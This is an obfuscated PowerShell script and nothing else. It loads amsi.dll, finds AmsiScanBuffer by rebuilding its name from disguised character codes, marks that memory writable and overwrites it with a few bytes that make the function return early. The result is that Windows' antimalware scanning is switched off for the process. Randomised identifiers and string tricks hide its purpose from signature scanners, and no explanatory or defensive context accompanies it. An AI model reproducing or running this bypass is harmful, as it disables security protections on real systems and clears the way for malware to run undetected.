$iv74dRBHsPBl = @"
using System;
using System.Runtime.InteropServices;
public class iv74dRBHsPBl {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr ERfQ, string w63VwJ3BFnY0);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr IrO4Lw, UIntPtr ruAqubJmotLLKrlGncIr, uint tihMft5ueuB2yTr_h, out uint ut1dyaC);
}
"@

Add-Type $iv74dRBHsPBl

$gyHyh = [iv74dRBHsPBl]::LoadLibrary("$([CHaR]([ByTe]0x61)+[ChAR]([byTE]0x6d)+[cHAr]([byte]0x73)+[ChAr](105*99/99)+[Char](46*8/8)+[cHAr](100)+[char]([byte]0x6c)+[cHaR](108+14-14))")
$hI3Ie = [iv74dRBHsPBl]::GetProcAddress($gyHyh, "$(('ÀmsìScànBúf'+'fèr').NORMALIze([cHAr]([BytE]0x46)+[ChaR]([BYtE]0x6f)+[Char](114)+[Char]([BYTe]0x6d)+[ChaR]([BYtE]0x44)) -replace [CHaR]([Byte]0x5c)+[CHar]([BYte]0x70)+[Char](123+94-94)+[cHaR]([BYtE]0x4d)+[CHar]([Byte]0x6e)+[CHar]([Byte]0x7d))")
$p = 0
[iv74dRBHsPBl]::VirtualProtect($hI3Ie, [uint32]5, 0x40, [ref]$p)
$Wpk2xlCTKIGqTJSpCHz = "0xB8"
$eZbZS = "0x57"
$stq = "0x00"
$EJtWk0N = "0x07"
$_f0Sk = "0x80"
$HoXjbzNhhOBUqrKDNvH = "0xC3"
$Pw8jR72ExJEMVm9tm = [Byte[]] ($Wpk2xlCTKIGqTJSpCHz,$eZbZS,$stq,$EJtWk0N,+$_f0Sk,+$HoXjbzNhhOBUqrKDNvH)
[System.Runtime.InteropServices.Marshal]::Copy($Pw8jR72ExJEMVm9tm, 0, $hI3Ie, 6)